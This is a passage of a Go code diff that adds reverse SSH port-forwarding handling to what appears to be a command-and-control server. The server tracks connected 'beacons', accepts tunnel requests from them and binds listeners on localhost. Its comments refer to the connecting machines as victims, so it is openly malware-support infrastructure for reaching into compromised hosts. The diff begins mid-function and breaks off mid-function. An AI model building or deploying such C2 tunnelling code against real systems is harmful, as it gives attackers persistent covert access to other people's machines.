@@ -192,3 +192,129 @@ func ServeSSH(port int) error {
 			// close sockets opened by this client
 			for bind, listener := range a.Forward.Listeners {
 				if config.DEBUG {
+					log.Printf("[%s] Closing listener bound to %s", a.Beacon.UID, bind)
+				}
+				listener.Close()
+			}
+
+			// close connection
+			a.Forward.SshConn.Close()
+			a.Forward.Conn.Close()
+
+			// set the session to zero value
+			a.Forward = nil
+
+			// update the client if it exists
+			if model.Exists(a.Beacon.UID) {
+				model.Store(a.Beacon.UID, a)
+			}
+
+		}()
+
+		// Accept requests & channels
+		go handleRequest(a, reqs)
+	}
+}
+
+type tcpIPForwardPayloadReply struct {
+	Port uint32
+}
+
+func handleRequest(sessclient communication.Client, reqs <-chan *ssh.Request) {
+
+	client := sessclient.Forward
+
+	var tunnelOpen = false // switch guarding that at only one tunnel is allowed per victim
+
+	for req := range reqs {
+		client.Conn.SetDeadline(time.Now().Add(*maintimeout))
+
+		if config.DEBUG {
+			log.Printf("[%s] Out of band request: %v %v", sessclient.Beacon.UID, req.Type, req.WantReply)
+		}
+
+		// RFC4254: 7.1 for forwarding
+		if req.Type == "tcpip-forward" {
+			client.ListenMutex.Lock()
+			/* If we are closing or we already have open forward, do not set up a new listener */
+			if client.Stopping || tunnelOpen { // allow at most one tunnel
+				client.ListenMutex.Unlock()
+				req.Reply(false, []byte{})
+				continue
+			}
+
+			listener, bindinfo, err := handleTCPIPForward(sessclient, req)
+			if err != nil {
+				client.ListenMutex.Unlock()
+				continue
+			}
+
+			tunnelOpen = true
+
+			client.Listeners[bindinfo.Bound] = listener
+			client.ListenMutex.Unlock()
+
+			go handleListener(sessclient, bindinfo, listener)
+			continue
+		} else if req.Type == "cancel-tcpip-forward" {
+			client.ListenMutex.Lock()
+			handleTCPIPForwardCancel(sessclient, req)
+			tunnelOpen = false
+			client.ListenMutex.Unlock()
+			continue
+		} else {
+			// Discard everything else
+			req.Reply(false, []byte{})
+		}
+	}
+}
+
+func handleListener(sessclient communication.Client, bindinfo *bindInfo, listener net.Listener) {
+
+	// Start listening for connections
+	for {
+		lconn, err := listener.Accept()
+		if err != nil {
+			neterr := err.(net.Error)
+			if neterr.Timeout() {
+				log.Printf("[%s] Accept failed with timeout: %s", sessclient.Beacon.UID, err)
+				continue
+			}
+			if neterr.Temporary() {
+				log.Printf("[%s] Accept failed with temporary: %s", sessclient.Beacon.UID, err)
+				continue
+			}
+
+			break
+		}
+
+		go handleForwardTCPIP(sessclient, bindinfo, lconn)
+	}
+}
+
+func handleTCPIPForward(sessclient communication.Client, req *ssh.Request) (net.Listener, *bindInfo, error) {
+
+	var payload tcpIPForwardPayload
+	if err := ssh.Unmarshal(req.Payload, &payload); err != nil {
+		log.Printf("[%s] Unable to unmarshal payload", sessclient.Beacon.UID)
+		req.Reply(false, []byte{})
+		return nil, nil, fmt.Errorf("Unable to parse payload")
+	}
+
+	if config.DEBUG {
+		log.Printf("[%s] Request: %s %v %v", sessclient.Beacon.UID, req.Type, req.WantReply, payload)
+		log.Printf("[%s] Request to listen on %s:%d", sessclient.Beacon.UID, payload.Addr, payload.Port)
+	}
+
+	laddr := "127.0.0.1" // bind only on localhost - dont let the victim decide
+	lport := uint32(0)   // choose first open port - dont let the victim decide
+
+	bind := fmt.Sprintf("[%s]:%d", laddr, lport)
+	ln, err := net.Listen("tcp", bind)
+	if err != nil {
+		log.Printf("[%s] Listen failed for %s", sessclient.Beacon.UID, bind)
+		req.Reply(false, []byte{})
+		return nil, nil, err
+	}
+
+	netarray := strings.Split(ln.Addr().String(), ":")
